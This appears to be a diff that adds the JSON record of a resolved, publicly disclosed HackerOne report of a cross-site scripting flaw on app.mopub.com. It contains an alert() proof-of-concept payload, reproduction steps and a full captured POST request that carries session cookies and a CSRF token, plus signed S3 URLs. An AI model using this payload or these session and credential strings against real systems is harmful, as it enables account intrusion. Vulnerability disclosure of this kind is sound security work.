@@ -1,0 +1,146 @@
+{
+  "id": 692352,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTIzNTI=",
+  "url": "https://hackerone.com/reports/692352",
+  "title": "XSS on https://app.mopub.com/reports/custom/add/ [new-d1]",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2019-09-11T15:00:01.430Z",
+  "submitted_at": "2019-09-11T15:00:01.430Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "c00lbugs",
+    "url": "/c00lbugs",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "X / xAI",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-12-07T17:25:49.754Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-11-07T17:25:45.134Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Parameter**\nnew-d1\n\n**Payload**\n</img><img src=x onerror=alert(domain)>\n\n**Steps to reproduce**\n1. Go to URL: https://app.mopub.com/reports/custom/add/\n2. Start burp suite proxy, intercept on.\n4. Enter payload in vulnerable parameter.\n3. click on Run and Save button.\n4. You will see java-script getting executed. \n\n##POST Request\n```\nPOST /reports/custom/add/ HTTP/1.1\nHost: app.mopub.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.mopub.com/reports/custom/\nX-CSRFToken: ITzZsPAjFJeRBqKUKodU5C4w2lu2x5MG7Gec9L8jtqMOVilWX7gPTxwsXcgIloIR\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------200821510612490\nContent-Length: 1690\nConnection: close\nCookie: _gcl_au=1.1.1687186367.1563287045; _ga=GA1.2.1543739358.1563287048; csrftoken=ITzZsPAjFJeRBqKUKodU5C4w2lu2x5MG7Gec9L8jtqMOVilWX7gPTxwsXcgIloIR; mp__mixpanel=%7B%22distinct_id%22%3A%20%2216bfb2ba1103c5-0143fdd5f3a3c58-4c312f7f-e1000-16bfb2ba111485%22%2C%22%24device_id%22%3A%20%2216bfb2ba1103c5-0143fdd5f3a3c58-4c312f7f-e1000-16bfb2ba111485%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.mopub.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.mopub.com%22%7D; mp_mixpanel__c=1; sessionid=p49r0bbeqb3laimfoii6vcny4yxbv6ww; mp_c99579c4804fba6b8aeed7a911581652_mixpanel=%7B%22distinct_id%22%3A%20%22d897f99976a646f5a619e52ed44bbb80%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%3Fnext%3D%2Fdashboard%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22member%22%2C%22accountKey%22%3A%20%22aeb905f4d0984a02be8a00d27aae73df%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22d897f99976a646f5a619e52ed44bbb80%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22285f16e8e3a64ffc9bcc629faccb3d23%22%7D\n\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-saved\"\n\non\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-name\"\n\nhello xss\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-interval\"\n\nyesterday\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-start\"\n\n09/10/2019\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-end\"\n\n09/10/2019\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-sched_interval\"\n\nnone\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-recipients\"\n\nganesh@mailinator.com\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-d1\"\n\napp</img><img src=x onerror=alert(domain)>\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-d2\"\n\n\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-show_attempts_or_reqs\"\n\non\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-show_impressions\"\n\non\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-show_clicks\"\n\non\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-show_revenue\"\n\non\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-show_ctr\"\n\non\n-----------------------------200821510612490\nContent-Disposition: form-data; name=\"new-show_conversions\"\n\non\n-----------------------------200821510612490--\n\n```\n\n{F580318}\n\n{F580319}\n\n{F580316}\n\n{F580317}\n\n## Impact\n\nCross-site scripting is a flaw that allows users to inject HTML or JavaScript code into a page enabling arbitrary input. There are two main variants of XSS, stored and reflected, DOM.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 580316,
+      "file_name": "Annotation_2019-09-11_202218.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pF4kMPjBLESHKK2PoBhAGmZw?response-content-disposition=attachment%3B%20filename%3D%22Annotation_2019-09-11_202218.JPG%22%3B%20filename%2A%3DUTF-8%27%27Annotation_2019-09-11_202218.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTABFVXIV%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130551Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARSTUTlLtqfCtFxZFk4rYBghKF7D2jkZPr1QwTWq%2BGXAiEAv6miAxW0spzaBwsrYsw578P9GcnLl7tkD3KSwPtv%2FLcqsQUIExADGgwwMTM2MTkyNzQ4NDkiDMRzqVS0jkm%2Bv4Wa5CqOBR76uTTT2nWrSXGgdyoE1NtYArYx2zNugI3zy19%2F0NbNPsgMq%2BVIwUVMaICZwERNFM3Ynuw2lLcwlMZcx%2BKlA46VydjCvjJdSq3rZg3mrz6TCgarB3l3mOWRfQE7%2B6R5kd6pEt%2BXzCzO7Oz%2ByqGuVWwSEJgTeLJZFuKmcZSMr%2F86UgsB2gwp%2FZD%2BVvNNEwLTJDQTpmL172aomVt9oe7CwNNlZLemIjD6ujwNcLYWjNdCqcLsLveQ8eNBidevZY5USEd4wbLhH1SUQr2qg2HOFblt%2B9N18%2FzvHhQARS4%2FBs1utdgFK9di6S9hbUMavj%2FiVFcgVamg5XDadOYJfrZhMLXjs7JFoR5LI%2FxLOH6gufc39sOgW1jEXlKXX4F3gv5U0Ts3ncRxb6pUdDsqKHC11mIkJzZIfP0cdJZBykZmj%2BvkVm9hiT6L3B7y87YPSkairkgvBvuGNRdIxrNI%2F%2FH1eBRFxB9M%2B4gteUwrNQJ3zAOkBciHqDn%2BbYeR3FV2E4lYSNE0XEAd9ckVJk7zzITpTf%2Bqb2FJOl%2FGAUlM23wNxMVUUoKJfiCGUkFWaow4qptq6hpqUcQnpV9dRsOQUNFJZbSpdMwxTdu04nTB3fj7FMFhytDsNGl0x7bt5j2q58omJl5C41S4%2FwY0Xi7WkZxLvdxluHJpi2RxUWhNtpPQ88YCWMxi44HqDZ2FbWgM9VKZE1DGp0ml3eOOwdDQ5J3XAjG2g%2Fk5IRoMcX5ftfIjKzhs9JcgUtV%2FU2%2F5obSwXDm7OavJTNxLUTMWvO7BE78PSdr7FfUttD%2Fzh5Eog0%2F0nIlKw5MTl9P%2BtgACFqhih6dbvCfJ4yEfeChQ4s4RzK76W4zN4wdMmUwWJ3uf7I2xDzDomL%2FGBjqxAQjtEZAT4Ko0QTziHMwTUt45mr9X4bfKK2Aye%2F5C%2BNagm7ta0vwtP6vYQ3T9%2BWfsLrtvmlq2L5%2Bx4hQxDkQ4JX%2BhE7mNJwl633WTs4TPq9nosYvDd2GoZsXK5qqlsMIFl%2FShYPbzhH7eSCWgR6f5ZWkkX%2FDBkZ3Mt%2FPqqLHgMblgxWEB1fDGiCVYkb%2B16GM2CiNvSbYRIOcrNOa%2BgAm%2BfS%2FG3fn67R%2FB%2BtcmMCeqNEcnmA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0b226e86f55233f13529665b30a2867dea6841a0a24c9b4453e125f5279bfd0e",
+      "file_size": 157258,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 580317,
+      "file_name": "Annotation_2019-09-11_202118.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MJSdHedZntjcGn5MNTZHL61y?response-content-disposition=attachment%3B%20filename%3D%22Annotation_2019-09-11_202118.JPG%22%3B%20filename%2A%3DUTF-8%27%27Annotation_2019-09-11_202118.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTABFVXIV%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130551Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARSTUTlLtqfCtFxZFk4rYBghKF7D2jkZPr1QwTWq%2BGXAiEAv6miAxW0spzaBwsrYsw578P9GcnLl7tkD3KSwPtv%2FLcqsQUIExADGgwwMTM2MTkyNzQ4NDkiDMRzqVS0jkm%2Bv4Wa5CqOBR76uTTT2nWrSXGgdyoE1NtYArYx2zNugI3zy19%2F0NbNPsgMq%2BVIwUVMaICZwERNFM3Ynuw2lLcwlMZcx%2BKlA46VydjCvjJdSq3rZg3mrz6TCgarB3l3mOWRfQE7%2B6R5kd6pEt%2BXzCzO7Oz%2ByqGuVWwSEJgTeLJZFuKmcZSMr%2F86UgsB2gwp%2FZD%2BVvNNEwLTJDQTpmL172aomVt9oe7CwNNlZLemIjD6ujwNcLYWjNdCqcLsLveQ8eNBidevZY5USEd4wbLhH1SUQr2qg2HOFblt%2B9N18%2FzvHhQARS4%2FBs1utdgFK9di6S9hbUMavj%2FiVFcgVamg5XDadOYJfrZhMLXjs7JFoR5LI%2FxLOH6gufc39sOgW1jEXlKXX4F3gv5U0Ts3ncRxb6pUdDsqKHC11mIkJzZIfP0cdJZBykZmj%2BvkVm9hiT6L3B7y87YPSkairkgvBvuGNRdIxrNI%2F%2FH1eBRFxB9M%2B4gteUwrNQJ3zAOkBciHqDn%2BbYeR3FV2E4lYSNE0XEAd9ckVJk7zzITpTf%2Bqb2FJOl%2FGAUlM23wNxMVUUoKJfiCGUkFWaow4qptq6hpqUcQnpV9dRsOQUNFJZbSpdMwxTdu04nTB3fj7FMFhytDsNGl0x7bt5j2q58omJl5C41S4%2FwY0Xi7WkZxLvdxluHJpi2RxUWhNtpPQ88YCWMxi44HqDZ2FbWgM9VKZE1DGp0ml3eOOwdDQ5J3XAjG2g%2Fk5IRoMcX5ftfIjKzhs9JcgUtV%2FU2%2F5obSwXDm7OavJTNxLUTMWvO7BE78PSdr7FfUttD%2Fzh5Eog0%2F0nIlKw5MTl9P%2BtgACFqhih6dbvCfJ4yEfeChQ4s4RzK76W4zN4wdMmUwWJ3uf7I2xDzDomL%2FGBjqxAQjtEZAT4Ko0QTziHMwTUt45mr9X4bfKK2Aye%2F5C%2BNagm7ta0vwtP6vYQ3T9%2BWfsLrtvmlq2L5%2Bx4hQxDkQ4JX%2BhE7mNJwl633WTs4TPq9nosYvDd2GoZsXK5qqlsMIFl%2FShYPbzhH7eSCWgR6f5ZWkkX%2FDBkZ3Mt%2FPqqLHgMblgxWEB1fDGiCVYkb%2B16GM2CiNvSbYRIOcrNOa%2BgAm%2BfS%2FG3fn67R%2FB%2BtcmMCeqNEcnmA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=35bce126090738b6dab3521d09c9138b3886e6736dd295c6de67323dfd46127b",
+      "file_size": 334517,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 580318,
+      "file_name": "Annotation_2019-09-11_202251.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r87MyemrMSSq4FskbVr4QFAc?response-content-disposition=attachment%3B%20filename%3D%22Annotation_2019-09-11_202251.JPG%22%3B%20filename%2A%3DUTF-8%27%27Annotation_2019-09-11_202251.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTABFVXIV%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130551Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARSTUTlLtqfCtFxZFk4rYBghKF7D2jkZPr1QwTWq%2BGXAiEAv6miAxW0spzaBwsrYsw578P9GcnLl7tkD3KSwPtv%2FLcqsQUIExADGgwwMTM2MTkyNzQ4NDkiDMRzqVS0jkm%2Bv4Wa5CqOBR76uTTT2nWrSXGgdyoE1NtYArYx2zNugI3zy19%2F0NbNPsgMq%2BVIwUVMaICZwERNFM3Ynuw2lLcwlMZcx%2BKlA46VydjCvjJdSq3rZg3mrz6TCgarB3l3mOWRfQE7%2B6R5kd6pEt%2BXzCzO7Oz%2ByqGuVWwSEJgTeLJZFuKmcZSMr%2F86UgsB2gwp%2FZD%2BVvNNEwLTJDQTpmL172aomVt9oe7CwNNlZLemIjD6ujwNcLYWjNdCqcLsLveQ8eNBidevZY5USEd4wbLhH1SUQr2qg2HOFblt%2B9N18%2FzvHhQARS4%2FBs1utdgFK9di6S9hbUMavj%2FiVFcgVamg5XDadOYJfrZhMLXjs7JFoR5LI%2FxLOH6gufc39sOgW1jEXlKXX4F3gv5U0Ts3ncRxb6pUdDsqKHC11mIkJzZIfP0cdJZBykZmj%2BvkVm9hiT6L3B7y87YPSkairkgvBvuGNRdIxrNI%2F%2FH1eBRFxB9M%2B4gteUwrNQJ3zAOkBciHqDn%2BbYeR3FV2E4lYSNE0XEAd9ckVJk7zzITpTf%2Bqb2FJOl%2FGAUlM23wNxMVUUoKJfiCGUkFWaow4qptq6hpqUcQnpV9dRsOQUNFJZbSpdMwxTdu04nTB3fj7FMFhytDsNGl0x7bt5j2q58omJl5C41S4%2FwY0Xi7WkZxLvdxluHJpi2RxUWhNtpPQ88YCWMxi44HqDZ2FbWgM9VKZE1DGp0ml3eOOwdDQ5J3XAjG2g%2Fk5IRoMcX5ftfIjKzhs9JcgUtV%2FU2%2F5obSwXDm7OavJTNxLUTMWvO7BE78PSdr7FfUttD%2Fzh5Eog0%2F0nIlKw5MTl9P%2BtgACFqhih6dbvCfJ4yEfeChQ4s4RzK76W4zN4wdMmUwWJ3uf7I2xDzDomL%2FGBjqxAQjtEZAT4Ko0QTziHMwTUt45mr9X4bfKK2Aye%2F5C%2BNagm7ta0vwtP6vYQ3T9%2BWfsLrtvmlq2L5%2Bx4hQxDkQ4JX%2BhE7mNJwl633WTs4TPq9nosYvDd2GoZsXK5qqlsMIFl%2FShYPbzhH7eSCWgR6f5ZWkkX%2FDBkZ3Mt%2FPqqLHgMblgxWEB1fDGiCVYkb%2B16GM2CiNvSbYRIOcrNOa%2BgAm%2BfS%2FG3fn67R%2FB%2BtcmMCeqNEcnmA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4d0442eca9cca6d65a0b65f7f498aae8cc0052fb46b613abafd24cacc512bcb0",
+      "file_size": 228545,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 580319,
+      "file_name": "Annotation_2019-09-11_202806.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qzuSdxRTG5t8NGnvAF4wUewF?response-content-disposition=attachment%3B%20filename%3D%22Annotation_2019-09-11_202806.JPG%22%3B%20filename%2A%3DUTF-8%27%27Annotation_2019-09-11_202806.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTABFVXIV%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130551Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARSTUTlLtqfCtFxZFk4rYBghKF7D2jkZPr1QwTWq%2BGXAiEAv6miAxW0spzaBwsrYsw578P9GcnLl7tkD3KSwPtv%2FLcqsQUIExADGgwwMTM2MTkyNzQ4NDkiDMRzqVS0jkm%2Bv4Wa5CqOBR76uTTT2nWrSXGgdyoE1NtYArYx2zNugI3zy19%2F0NbNPsgMq%2BVIwUVMaICZwERNFM3Ynuw2lLcwlMZcx%2BKlA46VydjCvjJdSq3rZg3mrz6TCgarB3l3mOWRfQE7%2B6R5kd6pEt%2BXzCzO7Oz%2ByqGuVWwSEJgTeLJZFuKmcZSMr%2F86UgsB2gwp%2FZD%2BVvNNEwLTJDQTpmL172aomVt9oe7CwNNlZLemIjD6ujwNcLYWjNdCqcLsLveQ8eNBidevZY5USEd4wbLhH1SUQr2qg2HOFblt%2B9N18%2FzvHhQARS4%2FBs1utdgFK9di6S9hbUMavj%2FiVFcgVamg5XDadOYJfrZhMLXjs7JFoR5LI%2FxLOH6gufc39sOgW1jEXlKXX4F3gv5U0Ts3ncRxb6pUdDsqKHC11mIkJzZIfP0cdJZBykZmj%2BvkVm9hiT6L3B7y87YPSkairkgvBvuGNRdIxrNI%2F%2FH1eBRFxB9M%2B4gteUwrNQJ3zAOkBciHqDn%2BbYeR3FV2E4lYSNE0XEAd9ckVJk7zzITpTf%2Bqb2FJOl%2FGAUlM23wNxMVUUoKJfiCGUkFWaow4qptq6hpqUcQnpV9dRsOQUNFJZbSpdMwxTdu04nTB3fj7FMFhytDsNGl0x7bt5j2q58omJl5C41S4%2FwY0Xi7WkZxLvdxluHJpi2RxUWhNtpPQ88YCWMxi44HqDZ2FbWgM9VKZE1DGp0ml3eOOwdDQ5J3XAjG2g%2Fk5IRoMcX5ftfIjKzhs9JcgUtV%2FU2%2F5obSwXDm7OavJTNxLUTMWvO7BE78PSdr7FfUttD%2Fzh5Eog0%2F0nIlKw5MTl9P%2BtgACFqhih6dbvCfJ4yEfeChQ4s4RzK76W4zN4wdMmUwWJ3uf7I2xDzDomL%2FGBjqxAQjtEZAT4Ko0QTziHMwTUt45mr9X4bfKK2Aye%2F5C%2BNagm7ta0vwtP6vYQ3T9%2BWfsLrtvmlq2L5%2Bx4hQxDkQ4JX%2BhE7mNJwl633WTs4TPq9nosYvDd2GoZsXK5qqlsMIFl%2FShYPbzhH7eSCWgR6f5ZWkkX%2FDBkZ3Mt%2FPqqLHgMblgxWEB1fDGiCVYkb%2B16GM2CiNvSbYRIOcrNOa%2BgAm%2BfS%2FG3fn67R%2FB%2BtcmMCeqNEcnmA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=06eaf9bd91793db5f19833e55b6d62c781efc1dfbd492f6df687374308c527a8",
+      "file_size": 173850,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-12-07T17:25:45.200Z",
+  "allow_singular_disclosure_after": -182720406.62566695,
+  "singular_disclosure_allowed": true,
+  "vote_count": 38,
+  "voters": [
+    "datalocaltmp",
+    "ali",
+    "safehacker_2715",
+    "null_rhythm",
+    "dudelazy",
+    "bb00x",
+    "cryptographer",
+    "drwiiche",
+    "0xm1racle",
+    "excute",
+    "and 28 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 1074,
+    "asset_type": "URL",
+    "asset_identifier": "mopub.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
